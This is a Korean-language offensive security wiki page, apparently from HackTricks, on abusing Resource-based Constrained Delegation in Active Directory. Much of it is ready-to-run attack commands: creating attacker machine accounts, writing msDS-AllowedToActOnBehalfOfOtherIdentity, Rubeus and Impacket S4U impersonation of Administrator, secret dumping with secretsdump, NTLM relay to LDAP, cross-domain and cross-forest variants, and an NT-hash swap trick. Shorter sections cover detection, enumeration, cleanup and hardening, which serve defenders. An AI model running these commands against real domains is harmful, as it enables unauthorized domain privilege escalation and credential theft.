# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation 기본 사항

Resource-based constrained delegation (RBCD)은 [constrained delegation](constrained-delegation.md)과 유사하지만 trust 방향이 반대입니다. 기존 constrained delegation은 principal이 어떤 service로 delegate할 수 있는지 기록하는 반면, RBCD는 **target resource**에 어떤 principal이 해당 resource에 사용자를 impersonate할 수 있는지 기록합니다.<sup>[[12]](#references)</sup>

target object의 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ attribute에는 해당 resource에서 다른 identity를 대신해 동작할 수 있는 principal을 식별하는 security descriptor가 포함됩니다.

또 다른 중요한 차이점은 충분한 **write permissions over a machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` 및 유사한 권한)을 가진 principal이 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_를 설정할 수 있다는 점입니다. 기존 constrained delegation을 구성하려면 일반적으로 더 높은 권한의 administrative access가 필요합니다.<sup>[[1]](#references)</sup>

더 정확히 말하면, classic constrained-delegation 설정 변경은 일반적으로 domain controller의 `SeEnableDelegationPrivilege`에 의해 제한되며, 이 권한은 보통 매우 높은 권한을 가진 administrator가 보유합니다. RBCD는 결정을 target object의 security descriptor로 이동하므로, 해당 사용자 권한이 없어도 관련 computer-object property에 대한 write access만으로 충분할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 새로운 개념

`userAccountControl`의 **`TrustedToAuthForDelegation`** flag는 흔히 **S4U2Self**의 prerequisite로 설명되지만, 이는 완전한 설명이 아닙니다.\
SPN이 있는 service principal은 해당 flag 없이도 S4U2Self를 요청할 수 있습니다. `TrustedToAuthForDelegation`이 있으면 반환되는 service ticket은 **forwardable**이며, 없으면 일반적으로 **non-forwardable**입니다.<sup>[[5]](#references)</sup>

기존 constrained delegation은 S4U2Proxy 단계에서 **non-forwardable TGS**를 거부합니다. RBCD는 target의 security descriptor가 요청 service를 authorize하는 경우 해당 S4U2Self ticket을 허용할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Attack 구조

> **computer account**에 대해 **write-equivalent privileges**가 있다면 해당 machine에 대한 privileged access를 획득할 수 있습니다.

공격자가 이미 **victim computer object에 대한 write-equivalent privileges**를 보유하고 있다고 가정합니다.

1. 공격자는 **SPN**이 있는 account를 **compromise**하거나 하나를 **생성**합니다("Service A"). 기본적으로 authenticated domain user는 **_MachineAccountQuota_**에 의해 제어되는 최대 10개의 computer object를 생성할 수 있으며, computer object는 사용 가능한 SPN을 자동으로 제공합니다.
2. 공격자는 victim computer(ServiceB)에 대한 **WRITE privilege를 abuse**하여, ServiceA가 해당 victim computer(ServiceB)를 대상으로 모든 사용자를 impersonate할 수 있도록 **resource-based constrained delegation**을 구성합니다.
3. 공격자는 Rubeus를 사용하여 Service A에서 Service B로, **Service B에 privileged access가 있는** 사용자를 대상으로 **full S4U attack**(S4U2Self 및 S4U2Proxy)을 수행합니다.
1. S4U2Self (compromised 또는 created SPN account에서): **Administrator를 Service A로 나타내는 TGS**를 요청합니다(non-forwardable).
2. S4U2Proxy: 해당 **non-forwardable TGS**를 사용하여 **victim host**에 대한 **Administrator를 나타내는** service ticket을 요청합니다.
3. Service A가 target resource의 security descriptor에서 authorize되어 있으므로, 이 RBCD flow에서는 non-forwardable ticket도 사용할 수 있습니다.
4. 공격자는 **pass-the-ticket**을 수행하고 사용자를 **impersonate**하여 victim ServiceB에 **access**할 수 있습니다.<sup>[[1]](#references)</sup>

domain의 _**MachineAccountQuota**_를 확인하려면 다음을 사용할 수 있습니다:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 공격

### 컴퓨터 객체 생성

**[powermad](https://github.com/Kevin-Robertson/Powermad):**를 사용하여 도메인 내부에 컴퓨터 객체를 생성할 수 있습니다<sup>[[3]](#references)[[4]](#references)</sup>.
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation 구성

**Active Directory PowerShell 모듈 사용**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**PowerView 사용**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 완전한 S4U attack 수행 (Windows/Rubeus)

먼저 비밀번호 `123456`으로 새 Computer object를 생성했으므로, 해당 비밀번호의 hash가 필요합니다:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
이렇게 하면 해당 account의 RC4 및 AES hashes가 출력됩니다.\
이제 attack을 수행할 수 있습니다:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus의 `/altservice` param을 사용하면 한 번만 요청해도 더 많은 service에 대한 ticket을 생성할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> 사용자는 **"Account is sensitive and cannot be delegated."**로 표시될 수 있습니다. 해당 플래그가 활성화되어 있으면 이 delegation 흐름을 통해 해당 계정을 impersonate할 수 없습니다. BloodHound는 분석 중 이 속성을 표시합니다.

### Linux tooling: Impacket를 사용한 end-to-end RBCD (2024+)

Linux에서 작업하는 경우, 공식 Impacket tools를 사용하여 전체 RBCD chain을 수행할 수 있습니다:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- LDAP signing/LDAPS가 강제된 경우 `impacket-rbcd -use-ldaps ...`를 사용합니다.
- AES 키를 우선 사용합니다. 많은 최신 도메인에서는 RC4를 제한합니다. Impacket와 Rubeus 모두 AES-only 흐름을 지원합니다.
- Impacket는 일부 도구에서 `sname`("AnySPN")을 다시 작성할 수 있지만, 가능한 경우 올바른 SPN을 확보합니다(예: CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

사용자가 제어하는 **delegating principal**이 **resource computer**와 **다른 도메인**(또는 **다른 forest**)에 있더라도 악용 방식은 여전히 **RBCD**입니다. 그러나 ticket 흐름은 더 이상 일반적인 단일 도메인의 `S4U2Self -> S4U2Proxy`가 아닙니다.

### Cross-domain RBCD: configure the foreign principal by SID

**다른 도메인**에서 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 설정할 때, foreign machine/user를 target domain LDAP에서 이름으로 **resolvable**하지 못할 수 있습니다. 이 경우 foreign principal의 sAMAccountName/UPN 대신 해당 principal의 **SID**를 사용하여 delegation entry를 구성합니다.

이는 `ntlmrelayx.py`를 사용해 NTLM을 LDAP으로 relay할 때 특히 중요합니다:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid`는 `--escalate-user`를 SID로 처리하도록 `ntlmrelayx.py`에 지시하며, delegating account가 target domain에 속하지 않은 경우 필요합니다.
- 도구에 `User not found in LDAP`가 출력되더라도 security descriptor가 foreign SID를 직접 저장하므로 delegation write는 성공할 수 있습니다.

### Cross-domain RBCD: cross-realm S4U sequence

foreign principal이 `msDS-AllowedToActOnBehalfOfOtherIdentity`에 추가되면, 작동하는 cross-domain flow는 다음과 같습니다:<sup>[[9]](#references)[[13]](#references)</sup>

1. delegating principal의 자체 domain에서 해당 principal에 대한 **TGT**를 가져옵니다.
2. `krbtgt/<target-domain>`에 대한 **referral TGT**를 요청합니다.
3. target-domain DC에서 impersonated user에 대한 **cross-realm S4U2Self referral**을 요청합니다.
4. delegator domain에서 해당 user에 대한 실제 **S4U2Self** ticket을 요청합니다.
5. delegator domain에서 **S4U2Proxy**를 수행하여 target domain에 대한 referral ticket을 가져옵니다.
6. target-domain DC에서 최종 **S4U2Proxy**를 수행하여 `cifs/host.target`, `host/host.target` 등에 대한 service ticket을 가져옵니다.

이 때문에 기본 Linux tooling은 cross-domain RBCD에서 자주 실패합니다:<sup>[[9]](#references)</sup>
- request **realm**은 `TGS-REQ`에서 사용되는 TGT의 realm과 달라야 할 수 있습니다.
- chain에는 **독립적인 S4U2Proxy 단계**가 필요하며, `S4U2Self`만 수행하거나 `S4U2Self` 직후 단일 `S4U2Proxy`를 수행하는 것만으로는 충분하지 않습니다.

### Cross-domain RBCD from Linux

Synacktiv는 두 KDC를 명시적으로 처리하여 Linux에서 cross-realm sequence를 재현하는 Impacket `getST.py` implementation을 공개했습니다:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
운영상 새로운 인자는 다음과 같습니다:
- `-dc-ip`: **delegating** domain의 DC
- `-targetdomain`: **resource computer**의 domain
- `-targetdc`: **resource** domain의 DC

### Cross-forest RBCD limitations

Cross-forest RBCD에는 중요한 제한 사항이 있습니다. **impersonated user는 delegating principal과 동일한 forest에 속해야 합니다**. 즉, 사용자가 제어하는 machine account가 `valhalla.local`에 있고 대상 resource가 `asgard.local`에 있다면, 일반적으로 RBCD를 통해 해당 resource에서 임의의 `asgard.local` 사용자를 **impersonate**할 수 없습니다.<sup>[[9]](#references)</sup>

다음과 같은 경우에는 여전히 exploit할 수 있습니다:
- **delegating forest** 사용자가 다른 forest의 resource host에서 **local admin**(또는 그에 준하는 권한 보유자)인 경우
- trust가 필요한 authentication path를 허용하고, foreign SID가 대상 computer의 security descriptor에서 허용되는 경우

### Cross-forest RBCD protocol quirks

Cross-forest RBCD는 단순히 "cross-domain에 trust를 추가한 것"이 아닙니다. 관찰된 flow에는 일반적인 tooling이 역사적으로 놓치는 두 가지 특이 사항이 있습니다:<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`**를 설정하는 추가 **S4U2Proxy** request
2. 다른 etype을 요청했더라도 최종 service ticket이 **RC4**를 사용해 반환될 수 있음

실제 flow는 다음과 같습니다:

1. forest A의 delegating principal에 대한 TGT를 가져옵니다.
2. forest A에서 impersonated user에 대한 **S4U2Self**를 요청합니다.
3. forest A에서 **S4U2Proxy**를 요청하여 forest B에 대한 referral TGT를 가져옵니다.
4. forest A에서 **S4U2Self ticket을 additional ticket으로 포함하지 않은 상태로**, `branch-aware`를 활성화하여 두 번째 **S4U2Proxy**를 전송하고 forest B에 대한 또 다른 referral TGT를 가져옵니다.
5. 선택적으로 forest B에서 delegating principal에 대한 일반 service ticket을 요청합니다(이 ticket은 최종 abuse에 필요하지 않습니다).
6. 3단계와 4단계의 referral ticket을 사용하여 forest B에서 impersonated forest-A user가 대상 SPN에 접근할 수 있는 최종 **S4U2Proxy** ticket을 요청합니다.

### Cross-forest RBCD from Linux

동일한 Synacktiv Impacket branch는 이 logic에 `-forest` switch를 추가합니다:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

**multi-domain forests**에서는 **S4U2Self**와 **S4U2Proxy**가 한 번의 referral 후 중단되지 않고 **recursive**하게 동작할 수 있습니다:

- **Recursive S4U2Self**: 첫 번째 `S4U2Self`는 **impersonated user's domain**으로 전송되고, 중간 parent/child hop은 `krbtgt/<REALM>`에 대한 일반 `TGS-REQ` referral을 통해 순회하며, **final `S4U2Self`**는 **delegating principal's own domain**에서 전송됩니다.
- 이는 machine account에 대한 **TGT만 보유**하고 있어도 동일 forest 내 다른 domain의 **admin을 impersonate**하고 `cifs/host`, `host/host`, `wsman/host` 등을 요청하기에 충분할 수 있음을 의미합니다.
- **Recursive S4U2Proxy**도 동일한 방식으로 trust chain을 따릅니다. 중간 hop에서는 다음 `krbtgt/<REALM>` referral을 요청할 때 이전 ticket을 TGT로 재사용하며, 마지막 hop에서만 최종 service ticket을 반환합니다.<sup>[[10]](#references)</sup>

실제 same-forest 예시는 다음과 같습니다:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less 도메인 간 / 포리스트 간 RBCD

**delegating principal이 SPN이 없는 user인 경우**, 마지막 재귀 `S4U2Self`가 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**와 함께 실패합니다. 해결 방법은 **마지막 hop만 `S4U2Self+U2U`로 재시도하는 것**입니다.<sup>[[10]](#references)</sup>

abuse chain의 요약:

1. KDC가 **RC4-HMAC (etype 23)** 쪽으로 유도되도록 **NT hash**로 인증합니다.
2. 먼저 **`-self -u2u`**를 요청하고, 이후 proxy 단계에서 사용할 티켓과 분리해 보관합니다.
3. `describeTicket.py`로 **TGT session key**를 추출합니다.
4. `changepasswd.py -newhashes <session_key>`를 사용해 사용자의 **NT hash**를 해당 **session key**로 교체합니다.
5. 별도의 **`-proxy`** 요청 중에 `S4U2Self+U2U` 티켓을 **`-additional-ticket`**으로 재사용합니다.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operational caveats:

- **첫 번째 trusted hop이 이미 다른 forest인 경우**, native Windows 동작에 맞추기 위해 **branch-aware** 알고리즘(`getST.py ... -forest`)을 우선 사용합니다. foreign forest가 chain의 **나중 단계에서만** 도달되는 경우에는 branch-aware가 아닌 recursive flow도 작동할 수 있습니다.<sup>[[9]](#references)</sup>
- 최신 **Windows Server 2022/2025** DC에서는 RC4 deprecation으로 인해 강제 RC4가 **`KDC_ERR_ETYPE_NOSUPP`**와 함께 실패할 수 있습니다. 이 경우 classic SPN-backed RBCD가 AES와 함께 여전히 작동하더라도 **SPN-less RBCD**가 불가능할 수 있습니다.<sup>[[15]](#references)</sup>
- 사용자의 hash/password를 변경하기 전에 **`S4U2Self+U2U`**를 실행합니다. `SamrChangePasswordUser`는 계정의 Kerberos AES keys를 **recompute**하지 않으므로, password 변경을 먼저 수행하면 이후 ticket requests가 실패할 수 있습니다.<sup>[[14]](#references)</sup>
- impersonated account는 여전히 **delegable** 상태여야 합니다. **Protected Users** 및 **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"**가 설정된 계정은 chain을 차단합니다.

## Detection / hardening notes

- domain/forest를 가로지르는 RBCD paths는 여전히 대개 **ACL abuse** 또는 **relay-to-LDAP**를 통해 생성됩니다. 일반적인 setup paths를 차단하려면 DC에서 **LDAP signing** 및 **LDAP channel binding**을 적용합니다.
- computer objects에서 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 쓸 수 있는 주체를 감사하고, **foreign security principals**를 포함해 저장된 SIDs를 확인합니다.
- trust가 많은 환경에서는 **Selective Authentication**, **SID filtering**, 그리고 foreign forest의 users가 resource hosts에서 **local admin** rights를 보유하는지 검토합니다.

### Accessing

마지막 command line은 **complete S4U attack**을 수행하고 Administrator에서 victim host로 보내는 **TGS를 memory에 inject**합니다.\
이 예제에서는 Administrator의 **CIFS** service에 대한 TGS를 요청했으므로 **C$**에 접근할 수 있습니다:
```bash
ls \\victim.domain.local\C$
```
### 서로 다른 service tickets 악용

[**여기에서 사용 가능한 service tickets 확인**](silver-ticket.md#available-services).

## 열거, 감사 및 정리

### RBCD가 구성된 컴퓨터 열거

PowerShell (SD를 디코딩하여 SID 확인):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket(한 번의 명령으로 읽기 또는 flush):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### 정리 / reset RBCD

- PowerShell (attribute 초기화):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos 오류

- **`KDC_ERR_ETYPE_NOTSUPP`**: 이는 kerberos가 DES 또는 RC4를 사용하지 않도록 구성되어 있는데 RC4 hash만 제공하고 있음을 의미합니다. Rubeus에 최소한 AES256 hash를 제공하거나 RC4, AES128 및 AES256 hash를 모두 제공하세요. 예: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 일반 사용자의 `-self` 중 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: delegating principal에 **SPN이 없을 가능성**이 높습니다. 일반적인 **`S4U2Self`** 대신 **`S4U2Self+U2U`**로 **마지막 hop**을 다시 시도하세요.<sup>[[10]](#references)</sup>
- **SPN-less RBCD** 중 **`KDC_ERR_ETYPE_NOSUPP`**: 최신 DC는 **`S4U2Self+U2U`** + session-key-substitution 트릭에 필요한 강제 **RC4-HMAC** 경로를 거부할 수 있습니다. 대신 AES를 사용하는 일반적인 **SPN-backed** RBCD 경로를 시도하세요.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: 이는 현재 computer의 시간이 DC의 시간과 다르며 kerberos가 제대로 작동하지 않음을 의미합니다.
- **`preauth_failed`**: 이는 제공된 username + hashes로 login할 수 없음을 의미합니다. hash를 생성할 때 username 안에 `$`를 넣는 것을 잊었을 수 있습니다 (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
- **`KDC_ERR_BADOPTION`**: 다음을 의미할 수 있습니다.
- impersonate하려는 user가 원하는 service에 access할 수 없습니다 (impersonate할 수 없거나 충분한 privileges가 없기 때문).
- 요청한 service가 존재하지 않습니다 (winrm에 대한 ticket을 요청했지만 winrm이 실행 중이 아닌 경우).
- 생성한 fakecomputer가 vulnerable server에 대한 privileges를 잃었으므로 다시 부여해야 합니다.
- classic KCD를 악용하고 있습니다. RBCD는 non-forwardable S4U2Self tickets와 함께 작동하지만, KCD에는 forwardable이 필요합니다.

## Notes, relays 및 대안

- LDAP가 filtered된 경우에도 AD Web Services (ADWS)를 통해 RBCD SD를 작성할 수 있습니다. 다음을 참조하세요:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains는 한 단계로 local SYSTEM을 획득하기 위해 RBCD에서 끝나는 경우가 많습니다. 실용적인 end-to-end 예시는 다음을 참조하세요:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding이 **disabled**이고 machine account를 생성할 수 있다면, **KrbRelayUp**과 같은 tools는 강제로 유도된 Kerberos auth를 LDAP로 relay하고, target computer object에서 machine account에 대해 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 설정한 다음, off-host에서 S4U를 통해 즉시 **Administrator**로 impersonate할 수 있습니다.<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Resource-Based Constrained Delegation을 악용한 Active Directory 공격](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegation에 대한 추가 설명 – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation Abuse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: Offensive Kerberos 개요](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [최신 syntax를 포함한 간단한 Linux cheatsheet](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - cross-domain 및 cross-forest RBCD 탐색](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - cross-domain 및 cross-forest RBCD 탐색: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation 개요](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos에서 RC4 사용 탐지 및 수정](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
